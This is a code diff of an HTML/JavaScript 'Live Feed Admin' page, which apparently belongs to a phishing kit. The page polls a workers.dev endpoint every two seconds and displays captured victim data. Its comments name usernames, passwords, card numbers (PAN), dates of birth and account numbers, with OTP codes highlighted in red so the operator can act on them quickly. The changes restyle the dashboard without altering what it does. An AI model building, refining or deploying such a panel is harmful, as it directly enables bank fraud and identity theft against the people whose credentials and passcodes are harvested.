@@ -3,79 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Admin</title>
+    <title>Live Feed Admin</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
         
-        /* White Background */
-        body { background-color: #ffffff; color: #333; padding-bottom: 20px; }
+        body { background-color: #ffffff; color: #333; padding-bottom: 30px; }
 
-        /* Header: Clean Blue/Grey */
+        /* Clean Header */
         .header {
-            background: #f8f9fa;
+            background: #ffffff;
             padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #eee;
+            border-bottom: 2px solid #f0f0f0;
             position: sticky;
             top: 0;
             z-index: 1000;
         }
-        .header h1 { font-size: 15px; color: #666; text-transform: uppercase; letter-spacing: 1px; }
+        .header h1 { font-size: 14px; color: #999; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; }
         
-        /* Count Badge */
+        /* Black Badge for Count */
         .v-badge {
             background: #000;
             color: #fff;
-            padding: 2px 12px;
-            border-radius: 15px;
-            font-weight: 700;
-            font-size: 16px;
+            padding: 4px 15px;
+            border-radius: 5px;
+            font-weight: 900;
+            font-size: 18px;
         }
 
         .container { 
-            padding: 10px; 
+            padding: 12px; 
             display: flex; 
             flex-direction: column; 
-            gap: 10px; 
+            gap: 12px; 
         }
 
-        /* Card Style */
+        /* Data Card */
         .data-row {
-            background: #ffffff;
-            padding: 15px;
-            border-radius: 10px;
-            border: 1px solid #f0f0f0;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
-            font-size: 17px;
+            background: #fdfdfd;
+            padding: 18px;
+            border-radius: 12px;
+            border: 1px solid #eeeeee;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+            font-size: 18px;
             font-weight: 700;
             line-height: 1.6;
             white-space: pre-wrap;
             word-break: break-all;
+            position: relative;
         }
 
-        /* --- COLOR CODING LOGIC --- */
-        
-        /* Green for User, Pass, Pan, Dob, Acc */
-        .text-green { color: #28a745 !important; }
-        
-        /* Red for OTP */
-        .text-red { color: #dc3545 !important; }
+        /* Color Logic */
+        .green-data { color: #218838; border-left: 6px solid #218838; } /* Success Green */
+        .red-otp { color: #d32f2f; border-left: 6px solid #d32f2f; }    /* Warning Red */
 
-        .time-stamp {
+        .time-label {
             display: block;
             font-size: 10px;
-            color: #ccc;
-            margin-top: 8px;
-            font-weight: 400;
+            color: #bbb;
+            margin-top: 10px;
+            font-weight: 500;
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>Live Feed</h1>
+        <h1>LIVE ACTIVITY</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
@@ -86,7 +83,7 @@
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
         let lastHash = "";
 
-        async function refresh() {
+        async function fetchLogs() {
             try {
                 const res = await fetch(workerURL);
                 const data = await res.json();
@@ -98,25 +95,29 @@
                 if (currentHash === lastHash) return;
                 lastHash = currentHash;
 
-                if (!data) return;
+                if (!data || data.length === 0) {
+                    display.innerHTML = "<p style='text-align:center; color:#ccc; margin-top:20px;'>Waiting for data...</p>";
+                    return;
+                }
+
+                // Update Count
                 badge.innerText = data.length;
 
-                // Render logic
+                // Render Data
                 display.innerHTML = data.map(log => {
+                    // Ignore visit/count rows from list
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) {
                         return ""; 
                     }
 
-                    // Color selection based on content
-                    let colorClass = "text-green"; // Default Green
-                    if (log.detail.includes("Otp:-")) {
-                        colorClass = "text-red"; // Red for OTP
-                    }
+                    // Check if it's an OTP row
+                    const isOtp = log.detail.toLowerCase().includes("otp:-");
+                    const colorClass = isOtp ? "red-otp" : "green-data";
 
                     return `
                         <div class="data-row ${colorClass}">
                             ${log.detail}
-                            <span class="time-stamp">${log.time || ''}</span>
+                            <span class="time-label">${log.time || ''}</span>
                         </div>
                     `;
                 }).join('');
@@ -124,9 +125,9 @@
             } catch (e) { console.log("Syncing..."); }
         }
 
-        // Auto update every 2 seconds
-        setInterval(refresh, 2000);
-        window.onload = refresh;
+        // 2 Second Auto-Refresh
+        setInterval(fetchLogs, 2000);
+        window.onload = fetchLogs;
     </script>
 </body>
 </html>
